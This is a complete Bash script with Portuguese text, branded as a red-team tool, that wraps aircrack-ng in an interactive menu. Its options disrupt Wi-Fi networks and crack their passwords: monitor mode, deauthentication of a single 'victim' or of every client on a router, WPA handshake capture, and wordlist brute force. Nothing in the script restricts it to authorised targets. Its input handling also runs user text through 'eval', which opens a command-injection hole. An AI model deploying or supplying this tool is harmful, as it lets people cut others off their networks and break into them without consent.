#!/bin/bash

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[0;36m'
NC='\033[0m'

LOG_FILE="log.txt"
INTERFACE=""
MONITOR_INTERFACE=""

logar() {
  echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

banner() {
  clear
  echo -e "${CYAN}
    █████╗ ██╗██████╗ ██████╗ ██╗   ██╗███████╗
   ██╔══██╗██║██╔══██╗██╔══██╗██║   ██║██╔════╝
   ███████║██║██████╔╝██████╔╝██║   ██║█████╗  
   ██╔══██║██║██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
   ██║  ██║██║██║     ██║     ╚██████╔╝███████╗
   ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝      ╚═════╝ ╚══════╝
        B O M B A   N A   R E D E - Red Team
${NC}"
}

check_tools() {
  for tool in aircrack-ng airmon-ng airodump-ng aireplay-ng; do
    if ! command -v $tool &>/dev/null; then
      echo -e "${RED}[!] Ferramenta $tool não encontrada. Instale com: sudo apt install aircrack-ng${NC}"
      exit 1
    fi
  done
}

read_interface() {
  read -rp "[*] Digite a interface Wi-Fi (ex: wlp2s0): " INTERFACE
}

ativar_monitor() {
  echo -e "${YELLOW}[*] Matando processos que atrapalham...${NC}"
  sudo airmon-ng check kill
  echo -e "${YELLOW}[*] Ativando modo monitor na interface $INTERFACE...${NC}"
  sudo airmon-ng start "$INTERFACE"

  MONITOR_INTERFACE=$(iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}' | head -n1)
  if [[ -z "$MONITOR_INTERFACE" ]]; then
    echo -e "${RED}[!] Falha ao ativar modo monitor.${NC}"
    exit 1
  fi
  echo -e "${GREEN}[+] Interface monitor ativa: $MONITOR_INTERFACE${NC}"
  logar "Modo monitor ativado em $MONITOR_INTERFACE"
}

desativar_monitor() {
  echo -e "${YELLOW}[*] Desativando modo monitor...${NC}"
  [[ -n "$MONITOR_INTERFACE" ]] && sudo airmon-ng stop "$MONITOR_INTERFACE"
  sudo systemctl restart NetworkManager.service
  logar "Modo monitor desativado"
}

scan_redes() {
  echo -e "${YELLOW}[*] Escaneando redes. Pressione CTRL+C para parar.${NC}"
  sudo airodump-ng "$MONITOR_INTERFACE"
}

listar_redes() {
  local csv="${AIRODUMP_PREFIX}-01.csv"
  if [[ ! -f "$csv" ]]; then
    echo -e "${RED}❌ Nenhum scan encontrado.${NC}"
    return
  fi

  mapfile -t redes < <(grep -a -E "^..:..:..:..:..:..," "$csv" | head -n 30)
  if [[ ${#redes[@]} -eq 0 ]]; then
    echo -e "${YELLOW}⚠️ Nenhuma rede encontrada.${NC}"
    return
  fi

  echo -e "${CYAN}╔═══════════════════════════╦════════════════════════════════════╦══════════════╗${NC}"
  echo -e "${CYAN}║ BSSID                     ║ ESSID                              ║ SINAL (dBm)  ║${NC}"
  echo -e "${CYAN}╠═══════════════════════════╬════════════════════════════════════╬══════════════╣${NC}"

  for linha in "${redes[@]}"; do
    bssid=$(echo "$linha" | cut -d',' -f1)
    sinal=$(echo "$linha" | cut -d',' -f9)
    essid=$(echo "$linha" | cut -d',' -f14)
    [[ -z "$essid" ]] && essid="(hidden)"

    sinal_int=$((sinal))
    if (( sinal_int >= -50 )); then cor=$GREEN; emoji="🔥"
    elif (( sinal_int >= -70 )); then cor=$YELLOW; emoji="⚠️"
    else cor=$RED; emoji="❌"
    fi

    printf "${cor}║ %-25s ║ %-32s ║ %11s %s ║${NC}\n" "$bssid" "$essid" "$sinal" "$emoji"
  done

  echo -e "${CYAN}╚═══════════════════════════╩════════════════════════════════════╩══════════════╝${NC}"
}

listar_clientes() {
  read -rp "Digite o BSSID da rede alvo: " bssid
  read -rp "Digite o canal (CH): " canal
  echo -e "${BLUE}>> Escaneando clientes conectados na rede... (5 segundos)${NC}"
  sudo timeout 5 airodump-ng --bssid "$bssid" -c "$canal" "$MONITOR_INTERFACE"
}

ataque_cliente() {
  local my_mac=$(cat /sys/class/net/"$INTERFACE"/address)
  read -rp "BSSID do roteador: " bssid
  read -rp "MAC da vítima: " alvo
  read -rp "Canal (CH): " canal

  if ! [[ "$alvo" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo -e "${RED}MAC inválido!${NC}"
    return
  fi

  [[ "${alvo,,}" == "${my_mac,,}" ]] && { echo -e "${YELLOW}⚠️ Não ataque seu próprio MAC!${NC}"; return; }

  sudo iw dev "$MONITOR_INTERFACE" set channel "$canal"
  echo -e "${YELLOW}>> Enviando 10 pacotes deauth para $alvo ...${NC}"
  sudo aireplay-ng --deauth 10 -a "$bssid" -c "$alvo" "$MONITOR_INTERFACE"
  logar "Ataque enviado para $alvo"
}

ataque_todos() {
  read -rp "BSSID do roteador: " bssid
  read -rp "Canal (CH): " canal
  read -rp "Quantidade de ataques (ex: 20): " qtd
  sudo iw dev "$MONITOR_INTERFACE" set channel "$canal"
  echo -e "${YELLOW}>> Enviando $qtd pacotes deauth para todos da rede...${NC}"
  sudo aireplay-ng --deauth "$qtd" -a "$bssid" "$MONITOR_INTERFACE"
  logar "Ataque em massa com $qtd pacotes para $bssid"
}

capturar_handshake() {
  read -rp "BSSID da rede alvo: " bssid
  read -rp "Canal da rede alvo: " canal
  read -rp "Nome do arquivo de captura (ex: hack_wifi): " capname

  echo -e "${YELLOW}[*] Capturando handshake (CTRL+C para parar)...${NC}"
  sudo airodump-ng --bssid "$bssid" -c "$canal" -w "$capname" "$MONITOR_INTERFACE" &
  local airodump_pid=$!

  sleep 5
  echo -e "${YELLOW}[*] Tentando desconectar clientes para capturar handshake...${NC}"
  sudo aireplay-ng -0 10 -a "$bssid" "$MONITOR_INTERFACE"

  read -rp "[*] Pressione ENTER quando o handshake foi capturado..."
  kill $airodump_pid 2>/dev/null
  logar "Handshake capturado e salvo em $capname"
}

brute_force() {
  read -rp "Arquivo .cap com handshake: " capfile
  read -rp "BSSID da rede alvo: " bssid
  read -rp "Caminho da wordlist: " wordlist

  capfile=$(eval echo "$capfile")
  wordlist=$(eval echo "$wordlist")

  if [[ ! -f "$capfile" ]]; then
    echo -e "${RED}[!] Arquivo de captura não encontrado!${NC}"
    return
  fi
  if [[ ! -f "$wordlist" ]]; then
    echo -e "${RED}[!] Wordlist não encontrada!${NC}"
    return
  fi

  echo -e "${YELLOW}[*] Iniciando ataque de força bruta...${NC}"
  sudo aircrack-ng -w "$wordlist" -b "$bssid" "$capfile"
  logar "Brute force finalizado com $wordlist em $capfile"
}

menu() {
  banner
  echo -e "${CYAN}[1]${NC} Ativar modo monitor"
  echo -e "${CYAN}[2]${NC} Desativar modo monitor"
  echo -e "${CYAN}[3]${NC} Escanear redes Wi-Fi"
  echo -e "${CYAN}[4]${NC} Listar redes encontradas"
  echo -e "${CYAN}[5]${NC} Listar clientes conectados"
  echo -e "${CYAN}[6]${NC} Atacar 1 cliente (deauth)"
  echo -e "${CYAN}[7]${NC} Atacar todos da rede"
  echo -e "${CYAN}[8]${NC} Capturar handshake (com ataque deauth)"
  echo -e "${CYAN}[9]${NC} Força bruta no handshake capturado"
  echo -e "${CYAN}[0]${NC} Sair"
}

trap_ctrlc() {
  echo -e "\n${YELLOW}[*] Ctrl+C detectado! Limpando ambiente...${NC}"
  desativar_monitor
  exit 1
}

trap trap_ctrlc INT

# Start
check_tools
read_interface

while true; do
  menu
  read -rp "Escolha uma opção: " opcao
  case $opcao in
    1) ativar_monitor ;;
    2) desativar_monitor ;;
    3) scan_redes ;;
    4) listar_redes ;;
    5) listar_clientes ;;
    6) ataque_cliente ;;
    7) ataque_todos ;;
    8) capturar_handshake ;;
    9) brute_force ;;
    0) desativar_monitor; echo -e "${GREEN}Saindo...${NC}"; break ;;
    *) echo -e "${RED}Opção inválida!${NC}" ;;
  esac
  read -rp "Pressione ENTER para continuar..."
done

